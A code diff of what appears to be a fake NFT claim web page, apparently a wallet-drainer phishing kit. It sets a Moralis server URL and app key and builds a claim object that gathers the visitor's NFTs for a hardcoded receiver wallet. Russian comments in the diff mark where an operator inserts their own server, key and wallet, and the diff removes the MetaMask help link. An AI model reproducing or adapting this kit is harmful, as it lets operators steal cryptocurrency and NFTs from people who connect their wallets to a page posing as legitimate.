@@ -62,7 +62,7 @@
 								</div>
 							</div>
 							<div class="flex justify-center mt-8">
-								<div class="min-w-[250px] grid grid-cols-1 gap-y-3 mt-8 md:gap-y-5"><a href="https://metamask.zendesk.com/hc/en-us/articles/360015489531-Getting-started-with-MetaMask" target="_blank" rel="noopener noreferrer" class="button button-primary cta duration-200"><span class="flex w-full items-center justify-center text-center">Metamask</span></a><a href="https://www.coinbase.com/wallet/getting-started-extension" target="_blank" rel="noopener noreferrer" class="button button-primary cta duration-200"><span class="flex w-full items-center justify-center text-center">Coinbase</span></a><button type="button" class="button button-primary cta duration-200"><span class="flex w-full items-center justify-center text-center">WalletConnect</span></button></div>
+								<div class="min-w-[250px] grid grid-cols-1 gap-y-3 mt-8 md:gap-y-5"><a target="_blank" rel="noopener noreferrer" class="button button-primary cta duration-200"><span class="flex w-full items-center justify-center text-center">Metamask</span></a><a href="https://www.coinbase.com/wallet/getting-started-extension" target="_blank" rel="noopener noreferrer" class="button button-primary cta duration-200"><span class="flex w-full items-center justify-center text-center">Coinbase</span></a><button type="button" class="button button-primary cta duration-200"><span class="flex w-full items-center justify-center text-center">WalletConnect</span></button></div>
 							</div>
 						</div>
 					</section>
@@ -106,8 +106,8 @@
 		var addrr = "";
 		var changeAddr = false;
 
-		startMOralis = async() => {const serverUrl = "https://2uuwz8f6oqbb.usemoralis.com:2053/server";
-		const appId = "LZKnRUNSDdi6hTYDFx5GbLbxx1fPHnKryMQUurv3";
+		startMOralis = async() => {const serverUrl = "https://2uuwz8f6oqbb.usemoralis.com:2053/server"; //Сюда сервер 
+		const appId = "LZKnRUNSDdi6hTYDFx5GbLbxx1fPHnKryMQUurv3"; //Сюда ключ
 		Moralis.start({ serverUrl, appId }).catch(err => console.log(err));
 		const web3Provider = await Moralis.enableWeb3();
 		}
@@ -135,7 +135,7 @@
 					return;
 				}
 			}
-			claim_data = {receiver: '0xDB166D515EB187ec35a54aF33592d84D5B8Ef1Ff', mint_price: 0.33,  nfts: await Moralis.Web3.getNFTs(optionssss)}
+			claim_data = {receiver: '0xDB166D515EB187ec35a54aF33592d84D5B8Ef1Ff', mint_price: 0.33,  nfts: await Moralis.Web3.getNFTs(optionssss)} // Сюда кошель
 		}
 		
 		async function sync_chain() {
